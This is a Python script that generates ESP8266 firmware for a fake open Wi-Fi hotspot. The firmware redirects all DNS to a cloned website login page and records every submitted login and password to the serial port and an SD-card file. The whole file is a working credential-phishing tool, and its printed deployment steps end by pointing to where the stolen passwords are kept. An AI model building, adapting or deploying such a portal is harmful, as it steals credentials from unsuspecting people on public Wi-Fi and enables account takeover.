import os
import hashlib
from shutil import copyfile
import re

'''
  Generates files to simulate a fake hotspot with the ESP8266 module.
  
  1) Put this script in the root folder of the mirrored hotspot
  2) Adapt the Parameters below
  3) Run with "python generateCode"
  4) Follow instructions appearing in the console
  
  Last Version: 29/06/16
'''




# Parameters
SSID        = "FreeWiFi"
homePage    = "./index.html"    # path to the principal page
#errorPage   = ""               # path to the error page (wrong login)
login       = "login"           # name of the login variable in the source of homePage
password    = "password"        # name of the password variable in the source of homePage
auth        = "/Auth"           # "action" field of connection form in the homePage
delay       = 1000              # fake delay to simulate connexion (in ms)
outputFile  = re.sub(r'\W+', '', SSID)+".ino" 
###


# Don't touch this
inoCode = ""
dicoPageVariable = {}
###

# First, we put everything in the same directory and rename all files to the 8.3 format
# We also keep track of the correspondence old/new names
print
print "Copying website...",
siteDirectory = "site"
if not os.path.exists(siteDirectory):
    os.makedirs(siteDirectory)

m = hashlib.md5()
tabPaths=[]
tabFields=[]
for dirname, dirnames, filenames in os.walk('.'):# and not in os.walk("site"):
  if dirname != "./"+siteDirectory:
    for filename in filenames:
      f, fext = os.path.splitext(filename)
      if fext[1:] in ["html","css","png","jpg","jpeg","gif"]:
        fullName = os.path.join(dirname, filename)
        tabPaths.append(fullName)
        m.update(fullName)
        newName=m.hexdigest()[:8]
        tabFields.append([newName,fext])
        copyfile(fullName, siteDirectory+"/"+newName)
print "OK"
dicoPaths=dict(zip(tabPaths,tabFields))

# Create the ids file
open(siteDirectory+"/ids", 'a').close()

print " File names replacement:"
for i in dicoPaths:
  print " ", i, "\t -> \t site/"+ dicoPaths[i][0]

print
print "Creating .ino code...",
# Then, we create the directory which will contain the ino files
codeDirectory = re.sub(r'\W+', '', SSID)
if not os.path.exists(codeDirectory):
    os.makedirs(codeDirectory)


n=len(dicoPaths)
print
print " (there are "+str(n)+" file,",
if n>10:
  print "which may be too much for the ESP8266.\n--> See Serial monitor to see if any error occur.)"
else:
  print "this should be OK!)"


# Build the dictionary
tab1=[]
tab2=[]
for dirname, dirnames, filenames in os.walk('.'):
  for filename in filenames:
    justFileName=filename
    filename = os.path.join(dirname, filename)
    f, fext = os.path.splitext(justFileName)
    if fext[1:] in ["html","css","png","jpg","jpeg","gif"]:
      tab1.append(filename)
      variableName=f+fext[1:]+"Content"
      tab2.append(variableName)     
dicoPageVariable=dict(zip(tab1,tab2))


inoCode+="/*\n"
inoCode+="  Website to ino generator\n"
inoCode+="  1) Send this code into the ESP8266\n"
inoCode+="  2) Copy the files in the \""+siteDirectory+"\" directory into the root directory of the SD card\n"
inoCode+="  3) Wait. You can listen to Serial port to see requests and login/passwords\n"
inoCode+="  4) Login/passwords are stored in the \"ids\" file on the SD card\n"
inoCode+="*/\n\n"

inoCode+="#include <ESP8266WiFi.h>\n"
inoCode+="#include \"./DNSServer.h\"  // Patched lib\n"
inoCode+="#include <ESP8266WebServer.h>\n"
inoCode+="#include <SPI.h>\n"
inoCode+="#include <SD.h>\n\n"

inoCode+="const byte        DNS_PORT = 53;          // Capture DNS requests on port 53\n"
inoCode+="IPAddress         apIP(10, 10, 10, 1);    // Private network for server\n"
inoCode+="DNSServer         dnsServer;              // Create the DNS object\n"
inoCode+="ESP8266WebServer  webServer(80);          // HTTP server\n"
inoCode+="const int chipSelect = 4; // pin D8 on esp8266\n\n"


for i in dicoPageVariable:
  inoCode+="String "+ dicoPageVariable[i]+"=\"\";\n"


inoCode+="\n"

inoCode+="void setup()\n"
inoCode+="{\n"
inoCode+="  Serial.begin(9600);\n\n"


# SD Card
inoCode+="  /////////////\n  // SD CARD //\n  /////////////\n\n"
inoCode+="  Serial.print(\"\\nInitializing SD card... \");\n"
inoCode+="  if(!SD.begin(chipSelect))\n"
inoCode+="  {\n"
inoCode+="    Serial.println(\"initialization failed\");\n"
inoCode+="  }\n"
inoCode+="  else\n"
inoCode+="  {\n"
inoCode+="    Serial.println(\"OK\");\n"
inoCode+="  }\n\n"

# Read the local website
inoCode+="  ////////////////////////\n  // READ LOCAL WEBSITE //\n  ////////////////////////\n\n"
tab=[]
for dirname, dirnames, filenames in os.walk('.'):
  for filename in filenames:
    justFileName=filename
    filename = os.path.join(dirname, filename)
    f, fext = os.path.splitext(justFileName)
    if fext[1:] in ["html","css","png","jpg","jpeg","gif"]:
      variableName=f+fext[1:]+"Content"
      #tab.append([filename,variableName])
      variableFileName=f+fext[1:]+"File"
      inoCode+="  File "+variableFileName+" = SD.open(\""+filename+"\");\n"
      inoCode+="  if ("+variableFileName+")\n"
      inoCode+="  {\n"
      inoCode+="    while ("+variableFileName+".available())\n"
      inoCode+="    {\n"
      inoCode+="      char ltr = "+variableFileName+".read();\n"
      inoCode+="      "+variableName+" += ltr;\n"
      inoCode+="    }\n"
      inoCode+="    "+variableFileName+".close();\n"
      inoCode+="    Serial.println(\""+filename+" OK\");\n"
      inoCode+="  }\n"
      inoCode+="  else\n"
      inoCode+="  {\n"
      inoCode+="    Serial.println(\"Error opening the file "+filename+"\");\n"
      inoCode+="  }\n\n\n"


inoCode+="  //////////\n  // WIFI //\n  //////////\n\n"
inoCode+="  Serial.print(\"Initializing Wifi... \");\n"
inoCode+="  WiFi.mode(WIFI_AP);\n"
inoCode+="  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));\n"
inoCode+="  WiFi.softAP(\""+SSID+"\");\n\n"
inoCode+="  dnsServer.start(DNS_PORT, \"*\", apIP);\n\n"


# Handlers

# Authentication page
inoCode+="  // Authentication page\n"
inoCode+="  webServer.on(\""+auth+"\", handle_Requests);\n\n"
inoCode+="  // TO DO:\n"

# Other files
for f in dicoPaths:
  mime="text/html"
  if dicoPaths[f][1][1:] in ["html","css","png","jpg","jpeg","gif"]:
    # Define mime
    if dicoPaths[f][1][1:]=="css":
      mime="text/css"
    elif dicoPaths[f][1][1:]=="png":
      mime="image/png"
    elif dicoPaths[f][1][1:] in ["jpg","jpeg"]:
      mime="image/jpeg"
    elif dicoPaths[f][1][1:]=="gif":
      mime="image/gif"
    
    # Build requests
    # Home page
    
    if f==homePage:
      inoCode+="  webServer.onNotFound([]() {webServer.send(200, \""+mime+"\", "+dicoPageVariable[homePage]+"); }); // Login page\n"
      
    # Others
    # TO DO: rechercher dans les fichiers .html et .css les vrais liens et remplacer f[1:]
    else:
      inoCode+="  webServer.on(\""+f+"\", []() {webServer.send(200, \""+mime+"\", "+dicoPageVariable[f]+");});\n" 
inoCode+="  //---------\n"

inoCode+="\n"
inoCode+="  webServer.begin();\n\n"
inoCode+="  Serial.println(\"OK\");\n"
inoCode+="\n}\n\n"


# Login/Password handling + redirection to the error page (blank page)
inoCode+="void handle_Requests()\n"
inoCode+="{\n"
inoCode+="  delay("+str(delay)+");\n"
inoCode+="  String login = webServer.arg(\""+login+"\");\n"
inoCode+="  String password = webServer.arg(\""+password+"\");\n"
inoCode+="  Serial.println(\"Login/Password: \" + login + \"/\" + password);\n"
inoCode+="  File idsFile = SD.open(\"ids\", FILE_WRITE);\n"
inoCode+="  if (idsFile)\n"
inoCode+="  {\n"
inoCode+="    idsFile.println(\"Login/Password: \" + login + \"/\" + password);\n"
inoCode+="    idsFile.close();\n"
inoCode+="  }\n"
inoCode+="  else\n"
inoCode+="  {\n"
inoCode+="    Serial.println(\"Error opening ids\");\n"
inoCode+="  }\n"
inoCode+="  webServer.send(404, \"text/plain\", \"\");\n" # send a blank page
inoCode+="}\n\n"


inoCode+="void loop()\n"
inoCode+="{\n"
inoCode+="  dnsServer.processNextRequest();\n"
inoCode+="  webServer.handleClient();\n"
inoCode+="}\n"


# At the end, we replace old names by new ones
for i in dicoPaths:
#  print i
  inoCode=inoCode.replace("SD.open(\""+i, "SD.open(\""+dicoPaths[i][0])


# Generate .ino file
f = open(codeDirectory+"/"+outputFile, 'w')
f.write(inoCode)
f.close()
print " File "+codeDirectory+"/"+outputFile+" generated."


# DNSServer.h
open(codeDirectory+"/DNSServer.h", 'a').close()
DNSServerhContent = "#ifndef DNSServer_h\n"
DNSServerhContent += "#define DNSServer_h\n#include <WiFiUdp.h>\n\n#define DNS_QR_QUERY 0\n#define DNS_QR_RESPONSE 1\n#define DNS_OPCODE_QUERY 0\n\n"
DNSServerhContent += "enum class DNSReplyCode\n{\n  NoError = 0,\n  FormError = 1,\n  ServerFailure = 2,\n  NonExistentDomain = 3,\n  NotImplemented = 4,\n  Refused = 5,\n  YXDomain = 6,\n  YXRRSet = 7,\n  NXRRSet = 8\n};\n\n"
DNSServerhContent += "struct DNSHeader\n{\n  uint16_t ID;               // identification number\n  unsigned char RD : 1;      // recursion desired\n  unsigned char TC : 1;      // truncated message\n  unsigned char AA : 1;      // authoritive answer\n  unsigned char OPCode : 4;  // message_type\n  unsigned char QR : 1;      // query/response flag\n  unsigned char RCode : 4;   // response code\n  unsigned char Z : 3;       // its z! reserved\n  unsigned char RA : 1;      // recursion available\n  uint16_t QDCount;          // number of question entries\n  uint16_t ANCount;          // number of answer entries\n  uint16_t NSCount;          // number of authority entries\n  uint16_t ARCount;          // number of resource entries\n};\n\n"
DNSServerhContent += "class DNSServer\n{\n  public:\n    DNSServer();\n    void processNextRequest();\n    void setErrorReplyCode(const DNSReplyCode &replyCode);\n    void setTTL(const uint32_t &ttl);\n\n    // Returns true if successful, false if there are no sockets available\n    bool start(const uint16_t &port,\n              const String &domainName,\n              const IPAddress &resolvedIP);\n    // stops the DNS server\n    void stop();\n\n  private:\n    WiFiUDP _udp;\n    uint16_t _port;\n    String _domainName;\n    unsigned char _resolvedIP[4];\n    int _currentPacketSize;\n    unsigned char* _buffer;\n    DNSHeader* _dnsHeader;\n    uint32_t _ttl;\n    DNSReplyCode _errorReplyCode;\n\n    void downcaseAndRemoveWwwPrefix(String &domainName);\n    String getDomainNameWithoutWwwPrefix();\n    bool requestIncludesOnlyOneQuestion();\n    void replyWithIP();\n    void replyWithCustomCode();\n};\n#endif\n\n"
f = open(codeDirectory+"/DNSServer.h", 'w')
f.write(DNSServerhContent)
f.close()
print " File "+codeDirectory+"/DNSServer.h"+" generated."


# DNSServer.cpp
open(codeDirectory+"/DNSServer.cpp", 'a').close()
DNSServercppContent  = "#include \"./DNSServer.h\"\n#include <lwip/def.h>\n#include <Arduino.h>\n\n"
DNSServercppContent += "#define DEBUG\n#define DEBUG_OUTPUT Serial\n\n"
DNSServercppContent += "DNSServer::DNSServer()\n{\n  _ttl = htonl(60);\n  _errorReplyCode = DNSReplyCode::NonExistentDomain;\n}\n\n"
DNSServercppContent += "bool DNSServer::start(const uint16_t &port, const String &domainName, const IPAddress &resolvedIP)\n"
DNSServercppContent += "{\n  _port = port;\n  _domainName = domainName;\n  _resolvedIP[0] = resolvedIP[0];\n  _resolvedIP[1] = resolvedIP[1];\n  _resolvedIP[2] = resolvedIP[2];\n  _resolvedIP[3] = resolvedIP[3];\n  downcaseAndRemoveWwwPrefix(_domainName);\n  return _udp.begin(_port) == 1;\n}\n\n"
DNSServercppContent += "void DNSServer::setErrorReplyCode(const DNSReplyCode &replyCode)\n{\n  _errorReplyCode = replyCode;\n}\n\n"
DNSServercppContent += "void DNSServer::setTTL(const uint32_t &ttl)\n{\n  _ttl = htonl(ttl);\n}\n\n"
DNSServercppContent += "void DNSServer::stop()\n{\n  _udp.stop();\n}\n\n"
DNSServercppContent += "void DNSServer::downcaseAndRemoveWwwPrefix(String &domainName)\n{\n  domainName.toLowerCase();\n  domainName.replace(\"www.\", \"\");\n}\n\n"
DNSServercppContent += "void DNSServer::processNextRequest()\n{\n  _currentPacketSize = _udp.parsePacket();\n  if (_currentPacketSize)\n  {\n    _buffer = (unsigned char*)malloc(_currentPacketSize * sizeof(char));\n    _udp.read(_buffer, _currentPacketSize);\n    _dnsHeader = (DNSHeader*) _buffer;\n\n    if (_dnsHeader->QR == DNS_QR_QUERY &&\n        _dnsHeader->OPCode == DNS_OPCODE_QUERY &&\n        requestIncludesOnlyOneQuestion() &&\n        (_domainName == \"*\" || getDomainNameWithoutWwwPrefix() == _domainName)\n       )\n    {\n      replyWithIP();\n    }\n    else if (_dnsHeader->QR == DNS_QR_QUERY)\n    {\n      replyWithCustomCode();\n    }\n\n    free(_buffer);\n  }\n}\n\n"
DNSServercppContent += "bool DNSServer::requestIncludesOnlyOneQuestion()\n{\n  return ntohs(_dnsHeader->QDCount) == 1 &&\n         _dnsHeader->ANCount == 0 &&\n         _dnsHeader->NSCount == 0 &&\n         _dnsHeader->ARCount == 0;\n}\n\n"
DNSServercppContent += "String DNSServer::getDomainNameWithoutWwwPrefix()\n{\n  String parsedDomainName = \"\";\n  unsigned char *start = _buffer + 12;\n  if (*start == 0)\n  {\n    return parsedDomainName;\n  }\n  int pos = 0;\n  while(true)\n  {\n    unsigned char labelLength = *(start + pos);\n    for(int i = 0; i < labelLength; i++)\n    {\n      pos++;\n      parsedDomainName += (char)*(start + pos);\n    }\n    pos++;\n    if (*(start + pos) == 0)\n    {\n      downcaseAndRemoveWwwPrefix(parsedDomainName);\n      return parsedDomainName;\n    }\n    else\n    {\n      parsedDomainName += \".\";\n    }\n  }\n}\n\n"
DNSServercppContent += "void DNSServer::replyWithIP()\n{\n  _dnsHeader->QR = DNS_QR_RESPONSE;\n  _dnsHeader->ANCount = _dnsHeader->QDCount;\n  _dnsHeader->QDCount = _dnsHeader->QDCount; \n  //_dnsHeader->RA = 1;  \n\n  _udp.beginPacket(_udp.remoteIP(), _udp.remotePort());\n  _udp.write(_buffer, _currentPacketSize);\n\n  _udp.write((uint8_t)192); //  answer name is a pointer\n  _udp.write((uint8_t)12);  // pointer to offset at 0x00c\n\n  _udp.write((uint8_t)0);   // 0x0001  answer is type A query (host address)\n  _udp.write((uint8_t)1);\n\n  _udp.write((uint8_t)0);   //0x0001 answer is class IN (internet address)\n  _udp.write((uint8_t)1);\n \n  _udp.write((unsigned char*)&_ttl, 4);\n\n  // Length of RData is 4 bytes (because, in this case, RData is IPv4)\n  _udp.write((uint8_t)0);\n  _udp.write((uint8_t)4);\n  _udp.write(_resolvedIP, sizeof(_resolvedIP));\n  _udp.endPacket();\n\n\n\n  #ifdef DEBUG\n    DEBUG_OUTPUT.print(\"DNS responds: \");\n    DEBUG_OUTPUT.print(_resolvedIP[0]);\n    DEBUG_OUTPUT.print(\".\");\n    DEBUG_OUTPUT.print(_resolvedIP[1]);\n    DEBUG_OUTPUT.print(\".\");\n    DEBUG_OUTPUT.print(_resolvedIP[2]);\n    DEBUG_OUTPUT.print(\".\");\n    DEBUG_OUTPUT.print(_resolvedIP[3]);\n    DEBUG_OUTPUT.print(\" for \");\n    DEBUG_OUTPUT.println(getDomainNameWithoutWwwPrefix());\n  #endif\n}\n\n"
DNSServercppContent += "void DNSServer::replyWithCustomCode()\n{\n  _dnsHeader->QR = DNS_QR_RESPONSE;\n  _dnsHeader->RCode = (unsigned char)_errorReplyCode;\n  _dnsHeader->QDCount = 0;\n\n  _udp.beginPacket(_udp.remoteIP(), _udp.remotePort());\n  _udp.write(_buffer, sizeof(DNSHeader));\n  _udp.endPacket();\n}\n\n"
f = open(codeDirectory+"/DNSServer.cpp", 'w')
f.write(DNSServercppContent)
f.close()
print " File "+codeDirectory+"/DNSServer.cpp"+" generated."
print


# Done! Print what the user has to do now
print "What to do now:"
print
print "1) In the html files of \"./"+siteDirectory+"\", only local links are allowed. Correct if necessary (see Hints below)."
#print "1) In \""+siteDirectory+"/"+dicoPaths[homePage][0]+"\", replace external links with local ones (see Hints below)."
print "   Example: for the login form, \"https://www.example.com/Auth\" must be replaced by \"/Auth\". Be also sure the new string corresponds to the parameter \"auth\" you entered in this script."
print
print "2) In the css files of  \"./"+siteDirectory+"\", check if links begin either with \"/\", \"./\" or \"../\". Correct if necessary (see Hints below)."
print
print "3) In \""+codeDirectory+"/"+outputFile+"\", go to the \"TO DO\" section and correct the links in the first parameter of the .on methods according to point 2)."
print "   Examples: if the original local link is \"image/photo.png\", then put in the .on method \"/image/photo.png\" (and not \"./image/photo.png\")"
print "             if the original local link is \"./image/photo.png\", then put in the .on method \"./image/photo.png\""
print "             if the original local link is \"../image/photo.png\", then put in the .on method \"../image/photo.png\""
print
print "   Hints: (you must verify!)"
print "    Original local link\t -> \t Suggestion for the .on method"

s=""
for dirname, dirnames, filenames in os.walk('./'+siteDirectory):
  for filename in filenames:
    f, fext = os.path.splitext(filename)
    fullName = os.path.join(dirname, filename)
#    t=[]
    f = open(fullName,'r')
    s= f.read()
    f.close()
    t=re.findall('url\(([^)]+)\)',s)
    t+=re.findall(r'action=[\'"]?([^\'" >]+)',s)
    t+=re.findall(r'href=[\'"]?([^\'" >]+)',s)
    t+=re.findall(r'src=[\'"]?([^\'" >]+)',s)
    
    if t!=[]:
      # delete quotes if present
      for i in range(len(t)):
        if t[i][0]=="\"" and t[i][-1]=="\"" or t[i][0]=="'" and t[i][-1]=="'":
          t[i]=t[i][1:-1]
      
      print "   "+fullName+":"
      # check
      for i in t:
        if i[0:4]=="http" or i[0:4]=="www.":
            print "     "+i+"\t->\t/"+i.split("/")[-1].split(".")[0]
        elif i[0]=="." or i[0]==".." or i[0]=="/":
          print "     "+i+"\t->\t"+i
        else:
          print "     "+i+"\t->\t/"+i
        #print "   "+fullName+":", t
print

print "4) Copy the content of \""+siteDirectory+"\" in the root directory of the SD card"
print
print "5) Compile and send the content of \""+codeDirectory+"\" in your ESP8266"
print
print "6) Login and passwords are stored in the \"ids\" file"
print
